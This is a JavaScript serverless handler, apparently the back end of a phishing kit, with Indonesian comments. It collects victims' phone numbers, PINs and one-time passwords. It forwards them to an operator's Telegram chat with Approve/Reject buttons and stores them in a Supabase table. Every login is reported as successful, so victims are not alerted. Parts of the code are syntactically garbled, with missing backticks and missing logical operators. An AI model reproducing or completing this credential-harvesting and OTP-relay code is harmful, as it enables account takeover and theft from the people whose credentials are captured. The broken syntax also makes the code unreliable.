Drake Red:
import { createClient } from '@supabase/supabase-js';

export default async function handler(req, res) {
  console.log('=== TELEGRAM.JS INVOKED ===');
  console.log('Method:', req.method);
  console.log('Headers:', req.headers);
  console.log('Body:', req.body);

  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    console.log('OPTIONS request - returning 200');
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    console.log('Method not allowed:', req.method);
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { phone, pin, otp, type } = req.body;
  console.log('Parsed data:', { phone, pin, otp, type });

  // ------------------ LOGIN ------------------
  if (type === 'login') {
    console.log('Processing LOGIN request');
    if (!phone || !pin) {
      console.log('Missing phone or pin');
      return res.status(400).json({ message: 'Phone and PIN required' });
    }

    // Cek environment variable Telegram
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const adminChatId = process.env.ADMIN_CHAT_ID;
    console.log('TELEGRAM_BOT_TOKEN exists:', !!telegramToken);
    console.log('ADMIN_CHAT_ID exists:', !!adminChatId);

    if (telegramToken && adminChatId) {
      try {
        const payload = {
          chat_id: adminChatId,
          text: 🔔 *User Login*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\``,
          parse_mode: 'Markdown'
        };
        console.log('Sending to Telegram:', payload);

        const response = await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        const result = await response.json();
        console.log('Telegram response:', result);

        if (!result.ok) {
          console.error('Telegram API error:', result);
        }
      } catch (err) {
        console.error('Exception while sending Telegram:', err);
      }
    } else {
      console.log('Telegram env vars missing, skipping notification');
    }

    console.log('Returning login success to frontend');
    return res.status(200).json({ success: true });
  }

  // ------------------ OTP ------------------
  console.log('Processing OTP request');
  if (!phone  !pin  !otp) {
    console.log('Missing phone, pin, or otp');
    return res.status(400).json({ message: 'Phone, PIN, and OTP required' });
  }

  // Cek Supabase env
  const supabaseUrl = process.env.SUPABASE_URL;
  const supabaseKey = process.env.SUPABASE_ANON_KEY;
  console.log('SUPABASE_URL exists:', !!supabaseUrl);
  console.log('SUPABASE_ANON_KEY exists:', !!supabaseKey);

  if (!supabaseUrl || !supabaseKey) {
    console.error('Supabase env vars missing');
    return res.status(500).json({ message: 'Server configuration error' });
  }

  const supabase = createClient(supabaseUrl, supabaseKey);

  try {
    console.log('Inserting into Supabase...');
    const { data, error } = await supabase
      .from('verifikasi_requests')
      .insert([{ phone, pin, otp, status: 'pending' }])
      .select();

    if (error) {
      console.error('Supabase insert error:', error);
      throw error;
    }
    if (!data || data.length === 0) {
      throw new Error('Insert failed, no data returned');
    }

    console.log('Insert successful, requestId:', data[0].id);

    // Kirim notifikasi ke admin dengan inline keyboard
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const adminChatId = process.env.ADMIN_CHAT_ID;

    if (telegramToken && adminChatId) {
      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: approve|${phone}|${pin}|${otp} },
            { text: "❌ Reject", callback_data: reject|${phone}|${pin}|${otp} }
          ]
        ]
      };

const payload = {
        chat_id: adminChatId,
        text: 🔔 *Permintaan Verifikasi*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\\n🔑 OTP: \${otp}\``,
        parse_mode: 'Markdown',
        reply_markup: inlineKeyboard
      };

      console.log('Sending OTP notification to Telegram:', payload);

      await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }

    console.log('Returning OTP success');
    return res.status(201).json({ success: true, requestId: data[0].id });
  } catch (err) {
    console.error('FATAL ERROR in OTP block:', err);
    return res.status(500).json({ message: 'Gagal menyimpan data', error: err.message });
  }
}
